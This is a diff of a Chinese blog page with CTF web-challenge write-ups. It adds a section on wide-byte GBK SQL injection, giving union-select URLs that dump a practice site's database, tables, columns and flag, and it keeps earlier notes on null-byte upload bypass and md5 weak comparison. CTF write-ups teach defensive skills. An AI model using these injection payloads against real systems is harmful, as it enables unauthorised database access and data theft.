@@ -88,7 +88,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.imgur.com/HJmHJ44.png">
 <meta property="og:image" content="https://i.imgur.com/Bg2sOGU.png">
-<meta property="og:updated_time" content="2018-11-15T16:06:30.552Z">
+<meta property="og:updated_time" content="2018-11-19T15:49:50.053Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="南邮CTF">
 <meta name="twitter:description" content="签到查看源码nctf{flag_admiaanaaaaaaaaaaa} md5弱类型比较==和=====先转化为一致的类型比较。===比较类型在比较字符串构造md5(‘240610708’)=md5(‘QNKCDZO’)payload：http://chinalover.sinaapp.com/web19?a=240610708 cookieburp抓包，修改login=1; 单身20年查看源码发">
@@ -337,7 +337,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  777
+                  896
                 </span>
               
 
@@ -353,7 +353,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3
+                  4
                 </span>
               
             </div>
@@ -413,6 +413,7 @@ require_once()
 <h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><p>basename[]返回路径中得文件名部分。<br>上传一个evil.jpg文件，抓包，发现提示<br><img src="https://i.imgur.com/Bg2sOGU.png" alt=""><br>发现不是php文件。</p>
 <p>思路：检验为php文件发现是通过basename,在/uploads/目录下。<br>由此可以构造./uploads/evil.php上传后发现变成evil.phpevil.jpg，由此可以想到利用0x00截断，构造出evil.php，绕过验证。</p>
 <h1 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h1><p>审计代码发现</p>
+<h1 id="sqlinjection3"><a href="#sqlinjection3" class="headerlink" title="sqlinjection3"></a>sqlinjection3</h1><p>宽字节注入。 利用%df%5c形成汉字。绕过\<br>爆库<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,database()%23  查出数据库为sae-chinalover，转化为16进制0x7361652d6368696e616c6f766572<br>爆表<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572%23<br>爆列<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23<br>爆字段<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,flag from ctf4%23</p>
 
       
     </div>
@@ -559,7 +560,7 @@ require_once()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">47</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -633,7 +634,7 @@ require_once()
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#签到"><span class="nav-number">1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#md5"><span class="nav-number">2.</span> <span class="nav-text">md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie"><span class="nav-number">3.</span> <span class="nav-text">cookie</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#单身20年"><span class="nav-number">4.</span> <span class="nav-text">单身20年</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#你从哪里来"><span class="nav-number">5.</span> <span class="nav-text">你从哪里来</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#单身100年"><span class="nav-number">6.</span> <span class="nav-text">单身100年</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#这题不是Web"><span class="nav-number">7.</span> <span class="nav-text">这题不是Web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#签到2"><span class="nav-number">8.</span> <span class="nav-text">签到2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bypass-again"><span class="nav-number">9.</span> <span class="nav-text">bypass again</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x00"><span class="nav-number">10.</span> <span class="nav-text">\x00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MYSQL"><span class="nav-number">11.</span> <span class="nav-text">MYSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含"><span class="nav-number">12.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-decode"><span class="nav-number">13.</span> <span class="nav-text">php decode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#单身一百年也没有用"><span class="nav-number">14.</span> <span class="nav-text">单身一百年也没有用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变量覆盖"><span class="nav-number">15.</span> <span class="nav-text">变量覆盖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-check"><span class="nav-number">16.</span> <span class="nav-text">pass check</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传绕过"><span class="nav-number">17.</span> <span class="nav-text">文件上传绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#起名字真难"><span class="nav-number">18.</span> <span class="nav-text">起名字真难</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#签到"><span class="nav-number">1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#md5"><span class="nav-number">2.</span> <span class="nav-text">md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie"><span class="nav-number">3.</span> <span class="nav-text">cookie</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#单身20年"><span class="nav-number">4.</span> <span class="nav-text">单身20年</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#你从哪里来"><span class="nav-number">5.</span> <span class="nav-text">你从哪里来</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#单身100年"><span class="nav-number">6.</span> <span class="nav-text">单身100年</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#这题不是Web"><span class="nav-number">7.</span> <span class="nav-text">这题不是Web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#签到2"><span class="nav-number">8.</span> <span class="nav-text">签到2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bypass-again"><span class="nav-number">9.</span> <span class="nav-text">bypass again</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x00"><span class="nav-number">10.</span> <span class="nav-text">\x00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MYSQL"><span class="nav-number">11.</span> <span class="nav-text">MYSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含"><span class="nav-number">12.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-decode"><span class="nav-number">13.</span> <span class="nav-text">php decode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#单身一百年也没有用"><span class="nav-number">14.</span> <span class="nav-text">单身一百年也没有用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变量覆盖"><span class="nav-number">15.</span> <span class="nav-text">变量覆盖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-check"><span class="nav-number">16.</span> <span class="nav-text">pass check</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传绕过"><span class="nav-number">17.</span> <span class="nav-text">文件上传绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#起名字真难"><span class="nav-number">18.</span> <span class="nav-text">起名字真难</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlinjection3"><span class="nav-number">19.</span> <span class="nav-text">sqlinjection3</span></a></li></ol></div>
             
 
           </div>
